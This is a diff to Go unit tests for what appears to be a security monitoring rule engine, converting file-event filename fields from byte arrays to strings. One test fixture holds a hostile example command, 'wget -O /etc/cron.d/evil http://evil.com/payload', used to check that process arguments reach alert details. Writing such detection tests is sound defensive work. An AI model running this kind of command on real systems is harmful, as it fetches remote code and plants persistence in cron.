@@ -620,11 +620,7 @@ func TestHasPrefix(t *testing.T) {
 }
 
 // Helper function to convert string to fixed-size byte array
-func stringToByteArray(s string) [256]byte {
-	var arr [256]byte
-	copy(arr[:], s)
-	return arr
-}
+func stringToByteArray(s string) string { return s }
 
 // Helper function to convert IP string to 16-byte array (IPv4 in first 4 bytes)
 func ipToBytes(ip string) [16]byte {
@@ -1226,8 +1222,8 @@ func TestFDEnrichment(t *testing.T) {
 	})
 
 	t.Run("open event uses fd.name same as filename", func(t *testing.T) {
-		var fname [256]byte
-		copy(fname[:], "/etc/passwd")
+		var fname string
+		fname = "/etc/passwd"
 		event := types.Event{
 			Type: types.EventFileAccess,
 			File: &types.FileEvent{
@@ -1949,8 +1945,8 @@ func TestThresholdRule_ChainGrouping(t *testing.T) {
 // as "empty" rather than being rejected as an unknown field.
 func TestContainerPodEnrichmentFields(t *testing.T) {
 	fileEvent := func(enrichment *types.EnrichmentInfo) types.Event {
-		var filename [256]byte
-		copy(filename[:], "/dev/vda1")
+		var filename string
+		filename = "/dev/vda1"
 		return types.Event{
 			Type:       types.EventFileAccess,
 			File:       &types.FileEvent{Filename: filename, Op: 1},
@@ -2066,8 +2062,8 @@ func TestWave60fShippedRuleSplit200(t *testing.T) {
 		opWrite = 2
 	)
 	event := func(comm, path string, op uint8, enrichment *types.EnrichmentInfo) types.Event {
-		var filename [256]byte
-		copy(filename[:], path)
+		var filename string
+		filename = path
 		e := types.Event{
 			Type:       types.EventFileAccess,
 			File:       &types.FileEvent{Filename: filename, Op: op},
@@ -2208,7 +2204,7 @@ func TestProcArgsReachesAlertDetails(t *testing.T) {
 			ProcArgs: "wget -O /etc/cron.d/evil http://evil.com/payload",
 			File:     &types.FileEvent{Op: 2},
 		}
-		copy(e.File.Filename[:], "/etc/cron.d/evil")
+		e.File.Filename = "/etc/cron.d/evil"
 		alerts := engine.Evaluate(e)
 		require.Len(t, alerts, 1)
 		assert.Equal(t, "/etc/cron.d/evil", alerts[0].Details["file.path"],
